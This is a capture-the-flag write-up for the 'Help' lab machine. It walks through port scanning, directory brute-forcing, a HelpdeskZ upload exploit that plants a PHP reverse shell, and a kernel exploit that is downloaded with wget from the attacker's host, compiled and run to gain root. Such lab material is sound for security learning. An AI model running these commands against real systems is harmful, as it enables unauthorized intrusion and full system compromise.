# Help
## nmap
```
$ nmap 10.10.10.121 --top-ports 1000 --open -sV
```
![](https://i.imgur.com/d3mzVKk.png)

It has http service, let's use gobuster to burte force the folder.
## gobuster
```
$ gobuster -u 10.10.10.121 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
![](https://i.imgur.com/B8hY52P.png)
## http
![](https://i.imgur.com/1Wjz3QD.png)

In the website, we can find it has helpdesk service.

![](https://i.imgur.com/HoprWXC.png)

As mentioned in the script, helpdesk in the default configuration allows upload for .php files and there is a weakness in the rename function of the uploaded file:

![](https://i.imgur.com/4FDroS4.png)

It can be clearly seen that the php file will still be uploaded successfully with a timestamp.
So by guessing the file was uploaded time, we can get RCE.

According the staps as instructed:
```
Steps to reproduce
httplocalhosthelpdeskzv=submit_ticket&action=displayForm

Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.
Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded

exploit.py httplocalhosthelpdeskz phpshell.php
```

Now we submit a ticket with hshell.php.
php reverse shell:
- https://github.com/pentestmonkey/php-reverse-shell

![](https://i.imgur.com/Sgd4H7l.png)

And we need to find where the uploaded php file is stored, I found it in the helpdeskz github.
```
define('UPLOAD_DIR', ROOTPATH . 'uploads/');
$uploaddir = UPLOAD_DIR.'tickets/'; 
```
The php file stored in "uploads/tickets/", we can use script to attack it.
```
$ python 40300.py http://10.10.10.121/support/uploads/tickets hshell.php
```
I receive a shell at 4444 port.

![](https://i.imgur.com/SMTTIau.png)
## user
Get user flag:

![](https://i.imgur.com/BnDnaCX.png)
## root
Check linux version.
```
$ uname -a
$ cat /etc/*-relaese
```
![](https://i.imgur.com/kpDJX3Y.png)

Find the priv exploit which match the linux version.

![](https://i.imgur.com/aQxpGku.png)

Store the priv script on the website and download it using wget on the victim machine.
```
$ wget http://10.10.15.61/44298.c
```
And complie this script.
```
$ gcc -o 44298 44298.c
$ ./44298
```
![](https://i.imgur.com/2MucOE4.png)
![](https://i.imgur.com/Z0Z6R3D.png)

Run successly! Now we have root permisssion.

The root flag:

![](https://i.imgur.com/iYjHJJT.png)
